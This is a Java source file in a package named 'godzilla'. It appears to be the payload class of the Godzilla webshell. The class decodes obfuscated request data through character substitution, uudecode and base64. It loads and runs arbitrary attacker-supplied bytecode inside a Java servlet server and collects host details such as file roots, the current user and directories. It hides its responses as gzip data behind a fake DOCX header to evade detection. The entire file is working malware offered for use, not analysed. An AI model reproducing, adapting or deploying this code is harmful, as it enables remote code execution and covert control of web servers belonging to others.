package godzilla;


import com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimeUtility;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.zip.GZIPOutputStream;
import javax.servlet.ServletRequest;

public class SimpleVer extends ClassLoader {
    HashMap parameterMap = new HashMap();
    HashMap sessionMap;
    Object servletContext;
    Object servletRequest;
    Object httpSession;
    byte[] requestData;
    ByteArrayOutputStream outputStream;

    public SimpleVer() {
    }

    public SimpleVer(ClassLoader var1) {
        super(var1);
    }

    public Class g(byte[] var1) {
        return super.defineClass(var1, 0, var1.length);
    }

    public byte[] run() {
        String var1 = this.get("evalClassName");
        String var2 = this.get("methodName");
        if (var2 != null) {
            if (var1 == null) {
                try {
                    Method var10 = this.getClass().getMethod(var2, (Class[])null);
                    return var10.getReturnType().isAssignableFrom(byte[].class) ? (byte[])((byte[])((byte[])((byte[])var10.invoke(this, (Object[])null)))) : "this method returnType not is byte[]".getBytes();
                } catch (Exception var6) {
                    return "error".getBytes();
                }
            } else {
                try {
                    Class var5 = (Class)this.sessionMap.get(var1);
                    if (var5 == null && this.httpSession != null) {
                        var5 = (Class)this.sessionMap.get(var1);
                    }

                    if (var5 != null) {
                        Object var6 = var5.newInstance();
                        var6.equals(this.parameterMap);
                        var6.toString();
                        Object var7 = this.parameterMap.get("result");
                        if (var7 != null) {
                            return byte[].class.isAssignableFrom(var7.getClass()) ? (byte[])((byte[])((byte[])((byte[])var7))) : "return typeErr".getBytes();
                        } else {
                            return new byte[0];
                        }
                    } else {
                        return "evalClass is null".getBytes();
                    }
                } catch (Exception var7) {
                    return "null".getBytes();
                }
            }
        } else {
            return "method is null".getBytes();
        }
    }

    public void formatParameter() {
        String uu_head = "begin 644 encoder.buf\n";
        String uu_foot = " \nend\n";
        String todecode = new String(this.requestData);
        todecode = todecode.replaceAll("b", "\n").replaceAll("a", "=").replaceAll("c", "&").replaceAll("e", "'").replaceAll("d", "\"").replaceAll("f", "<").replaceAll("g", ">").replaceAll("h", ";").replaceAll("i", ":").replace("j", "$").replaceAll("k", "%").replace("l", "^");
        todecode = uu_head + todecode + uu_foot;
        byte[] var1 = null;
//        Object var5 = null;

        try {
            byte[] uu_tmp = Uudecode(todecode.getBytes());
            uu_tmp = deleteZero(uu_tmp).getBytes();
            var1 = base64Decode((new String(uu_tmp)).substring(13));
        } catch (Exception var14) {
        }

        ByteArrayInputStream var2 = new ByteArrayInputStream(var1);
        ByteArrayOutputStream var3 = new ByteArrayOutputStream();
        String var4 = null;
        byte[] var5 = new byte[4];
//        Object var10 = null;

        try {
            while(true) {
                while(true) {
                    byte var8 = (byte)var2.read();
                    if (var8 == -1) {
                        var3.close();
                        var2.close();
                        return;
                    }

                    if (var8 == 2) {
                        var4 = new String(var3.toByteArray());
                        var2.read(var5);
                        int var9 = bytesToInt(var5);
                        byte[] var10 = new byte[var9];
                        int var11 = 0;

                        while((var11 += var2.read(var10, var11, var10.length - var11)) < var10.length) {
                        }

                        this.parameterMap.put(var4, var10);
                        var3.reset();
                    } else {
                        var3.write(var8);
                    }
                }
            }
        } catch (Exception var15) {
        }
    }

    public static byte[] Uudecode(byte[] todecode) throws Exception {
        InputStream inputStream = new ByteArrayInputStream(todecode);
        InputStream inputStreams = MimeUtility.decode(inputStream, "uuencode");
        byte[] bytes = new byte[inputStreams.available()];
        inputStream.read(bytes);
        return bytes;
    }

    public static String deleteZero(byte[] todelete) throws Exception {
        int length = 0;

        for(int i = 0; i < todelete.length; ++i) {
            if (todelete[i] == 0) {
                length = i;
                break;
            }
        }

        return new String(todelete, 0, length);
    }

    public boolean equals(Object var1) {
        if (var1 != null && this.handle(var1)) {
            this.formatParameter();
            return true;
        } else {
            return false;
        }
    }

    public boolean handle(Object var1) {
        if (ByteArrayOutputStream.class.isAssignableFrom(var1.getClass())) {
            this.outputStream = (ByteArrayOutputStream)var1;
            return false;
        } else {
            this.handlePayloadContext(var1);
            if (this.getSessionAttribute("sessionMap") != null) {
                this.sessionMap = (HashMap)this.getSessionAttribute("sessionMap");
            } else {
                this.sessionMap = new HashMap();
                this.setSessionAttribute("sessionMap", this.sessionMap);
            }

            if (this.servletRequest != null) {
                Object var2 = this.getMethodAndInvoke(this.servletRequest, "getAttribute", new Class[]{String.class}, new Object[]{"parameters"});
                if (var2 != null && byte[].class.isAssignableFrom(var2.getClass())) {
                    this.requestData = (byte[])((byte[])((byte[])((byte[])var2)));
                    if (this.requestData == null) {
                        return false;
                    }
                }
            }

            this.parameterMap.put("sessionMap", this.sessionMap);
            this.parameterMap.put("servletRequest", this.servletRequest);
            this.parameterMap.put("servletContext", this.servletContext);
            this.parameterMap.put("httpSession", this.httpSession);
            return true;
        }
    }

    private void handlePayloadContext(Object var1) {
        try {
            Method var2 = this.getMethodByClass(var1.getClass(), "getRequest", (Class[])null);
            Method var3 = this.getMethodByClass(var1.getClass(), "getServletContext", (Class[])null);
            Method var4 = this.getMethodByClass(var1.getClass(), "getSession", (Class[])null);
            if (var2 != null && this.servletRequest == null) {
                this.servletRequest = var2.invoke(var1, (Object[])null);
            }

            if (var2 == null && var1 instanceof ServletRequest) {
                this.servletRequest = var1;
            }

            if (var3 != null && this.servletContext == null) {
                this.servletContext = var3.invoke(var1, (Object[])null);
            }

            if (var4 != null && this.httpSession == null) {
                this.httpSession = var4.invoke(var1, (Object[])null);
            }
        } catch (Exception var5) {
        }

    }

    public String toString() {
        String var1 = "";

        try {
            ByteArrayOutputStream var2 = this.outputStream == null ? new ByteArrayOutputStream() : this.outputStream;
            if (this.parameterMap.get("evalNextData") != null) {
                this.run();
                this.requestData = (byte[])((byte[])((byte[])((byte[])this.parameterMap.get("evalNextData"))));
                this.parameterMap.clear();
                this.parameterMap.put("httpSession", this.httpSession);
                this.parameterMap.put("servletRequest", this.servletRequest);
                this.parameterMap.put("servletContext", this.servletContext);
                this.formatParameter();
            }

            byte[] origenres = this.run();
            if ((new String(origenres)).equals("ok")) {
                origenres = "".getBytes();
            } else {
                origenres = gzipE(origenres);
                byte[] docx_h = new byte[]{80, 75, 3, 4, 20, 0, 6};
                origenres = this.byteMerger(docx_h, origenres);
            }

            var2.write(origenres);
            var1 = this.outputStream == null ? "" : "";
            var2.close();
            this.requestData = null;
        } catch (Exception var5) {
        }

        this.parameterMap.clear();
        return var1;
    }

    public static byte[] gzipE(byte[] data) {
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outputStream);
            gzipOutputStream.write(data);
            gzipOutputStream.close();
            return outputStream.toByteArray();
        } catch (Exception var3) {
            throw new RuntimeException(var3);
        }
    }

    public byte[] byteMerger(byte[] bt1, byte[] bt2) {
        byte[] bt3 = new byte[bt1.length + bt2.length];
        System.arraycopy(bt1, 0, bt3, 0, bt1.length);
        System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length);
        return bt3;
    }

    public String get(String var1) {
        try {
            return new String((byte[])((byte[])((byte[])this.parameterMap.get(var1))));
        } catch (Exception var3) {
            return null;
        }
    }

    public byte[] getByteArray(String var1) {
        try {
            return (byte[])((byte[])((byte[])((byte[])this.parameterMap.get(var1))));
        } catch (Exception var3) {
            return null;
        }
    }

    public String listFileRoot() {
        File[] var1 = File.listRoots();
        String var2 = new String();

        for(int var3 = 0; var3 < var1.length; ++var3) {
            var2 = var2 + var1[var3].getPath();
            var2 = var2 + ";";
        }

        return var2;
    }

    public Object getSessionAttribute(String var1) {
        return this.httpSession != null ? this.getMethodAndInvoke(this.httpSession, "getAttribute", new Class[]{String.class}, new Object[]{var1}) : null;
    }

    public void setSessionAttribute(String var1, Object var2) {
        if (this.httpSession != null) {
            this.getMethodAndInvoke(this.httpSession, "setAttribute", new Class[]{String.class, Object.class}, new Object[]{var1, var2});
        }

    }

    public byte[] getBasicsInfo() {
        try {
            Enumeration var1 = System.getProperties().keys();
            String var2 = new String();
            var2 = var2 + "FileRoot : " + this.listFileRoot() + "\n";
            var2 = var2 + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/\n";
            var2 = var2 + "CurrentUser : " + System.getProperty("user.name") + "\n";
            var2 = var2 + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";

            try {
                String var3 = System.getProperty("java.io.tmpdir");
                char var4 = var3.charAt(var3.length() - 1);
                if (var4 != '\\' && var4 != '/') {
                    var3 = var3 + File.separator;
                }

                var2 = var2 + "TempDirectory : " + var3 + "\n";
            } catch (Exception var5) {
            }

            return var2.getBytes();
        } catch (Exception var6) {
            return "error".getBytes();
        }
    }

    public byte[] include() {
        byte[] var1 = this.getByteArray("binCode");
        String var2 = this.get("codeName");
        if (var1 != null && var2 != null) {
            try {
                SimpleVer var3 = new SimpleVer(this.getClass().getClassLoader());
                Class var4 = var3.g(var1);
                this.sessionMap.put(var2, var4);
                return "ok".getBytes();
            } catch (Exception var5) {
                return this.sessionMap.get(var2) != null ? "ok".getBytes() : var5.getMessage().getBytes();
            }
        } else {
            return "No parameter binCode,codeName".getBytes();
        }
    }

    Object getMethodAndInvoke(Object var1, String var2, Class[] var3, Object[] var4) {
        try {
            Method var5 = this.getMethodByClass(var1.getClass(), var2, var3);
            if (var5 != null) {
                return var5.invoke(var1, var4);
            }
        } catch (Exception var6) {
        }

        return null;
    }

    Method getMethodByClass(Class var1, String var2, Class[] var3) {
        Method var4 = null;

        while(var1 != null) {
            try {
                var4 = var1.getDeclaredMethod(var2, var3);
                var4.setAccessible(true);
                var1 = null;
            } catch (Exception var6) {
                var1 = var1.getSuperclass();
            }
        }

        return var4;
    }

    public static int bytesToInt(byte[] var0) {
        int var1 = var0[0] & 255 | (var0[1] & 255) << 8 | (var0[2] & 255) << 16 | (var0[3] & 255) << 24;
        return var1;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Object var1 = null;

        byte[] value;
        try {
            Class<?> z = Class.forName("com.sun.org.apache.xml.internal.security.utils.Base64");
            value = (byte[])((byte[])z.getMethod("decoder", String.class).invoke((Object)null, bs));
        } catch (Exception var6) {
            try {
                Class<?> zz = Class.forName("java.util.Base64");
                Object zzd = zz.getMethod("getDecoder", (Class[])null).invoke(zz, (Object[])null);
                value = (byte[])((byte[])zzd.getClass().getMethod("decode", String.class).invoke(zzd, bs));
            } catch (Exception var5) {
                Class<?> zz = Class.forName("sun.misc.BASE64Decoder");
                value = (byte[])((byte[])zz.getMethod("decodeBuffer", String.class).invoke(zz.newInstance(), bs));
            }
        }

        return value;
    }
}